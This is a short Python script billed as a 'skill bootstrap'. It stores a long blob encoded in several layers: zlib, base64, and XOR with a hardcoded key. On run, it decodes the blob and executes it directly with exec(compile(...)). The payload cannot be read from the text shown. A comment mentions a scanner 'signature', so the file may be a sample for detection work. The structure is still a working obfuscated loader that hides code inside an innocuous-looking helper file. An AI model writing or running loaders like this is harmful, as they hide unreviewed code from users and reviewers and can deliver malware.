#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxllEuXqjoQhX8QAxVbhMEdQAiJ8iYEEmYmgGgLtjzaxl9/6T7nrLvOusMMqmrvr3YFfTTQ8tgQzrUD5nOf6YZnitWjBj3IzpsB7Yad4+Jt8cJHZ5YGHU2MK6FK0kkTZ1Puf3gwFKNIBTfR/YHkkzseUYrZrqD6NrJjeaQKoTW5StBRDZWcV9rqVYC+gkQaaTAIU+sMmYpaqFDPxsQzT/Uyv3OsWXaZ/w7NvaskIOV2vIHF9LyFR1dx89yLL2YmAgmsYqIU2LXV0Y7INcCPyzWZ9w7Ix4mWT2yeoiGwBc5ehQb4V1npLyf5oy9MmsDb78svwS1MNevIK7MnX+XlBUh7OKe7dwE8T63mqU7IuSFyA83HdluB1nbaWKf+e21OncXnlFut/sjGnWMKhSYXu4Y511Meu1jglUhPrdg8cabfa+j2M6GrvYXeNRasP0D0qUkSBRANmqOvXVPDew6VxZ8FfWMdOop4leQFUrJb+7ubRyvRV5cXD1u/I7tbTgux4kCFyfbWOMYdYs3eSrWvMY6X/nHE+miUaWUn8+7MfCige9V4KpZ9Gt3/+0mEHt62aLdy4bHkYc3TozdwAswkP6jUv9feo9u4Ca4gOv5d38nPtHS8NPxLH6RVOtbzywTkbtD7eErqU39oP2sT0zca3EOqz0qAch+i9y6tuIAL7/DqVTb2+2JYh0C4KvmyL54T/J53MgKLfWT2ZiLDM8KTMGpwtc14M6Hi5pl9pBd2bVvtwSAfsrDci5qqdQ2R36Bd5lGNqRXpD8k8TujtJpMo1EPEasiyNv3JUzeVKYap83FB5d12XLZx4ygALO6hF3zPVwKV6Qc7WyN5J2bv7SsiOCCyz4zzEZ9CJVJZ5KjnMyp1F596vSQCJ8RomL8+sAcbljwBkzTTn37Fyw4dRpt8fHJzui68JxhdqBEvvB330+CgDQkpB+cYV+ZjyXPb+ol6OOfBgJ2QzAGqLILem/RjxJVy+uGZkPKHx4/e32+2Gzh6rOYKXWv7mq1sfqsS5brkoz7ZKO6RkmB6Yst9C5xD+JnJe5j7v/aTXOTAAlozt37KpR7iWGGBjJaNj17Lvvk0SL4VyPP2AeqPME+afBggVq5aAGwAGd2i0gyoSPcLD2ghemG//XO7zthz859e23NgbkzZ8B5iRdPD2ebW5TwSgztMc7+KX/d9JeOxiCN3OrDwh8/iH9BTPQYggn/1+/Ev77SQ0tRWD5mrYTo3K1DcLFrNStTmKFn4Z8PG+76Xou1DG92axV9Jheg42NrglUxodzNpRb6qF+Oki280oJj1zCguLwlZ0hTDm2t98wO9R7ZyW5Tl8Q8/E+sjW/4LyruApnUFuuz3Pf/S5+TcIH3QIBco5KsHFrr3xVR4aTQpQdO/AOJdpvA1Xc30x09+/6RBaef+859/AaqM6uk="
_K = bytes.fromhex("39b96b71c69e1445ac65074e")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
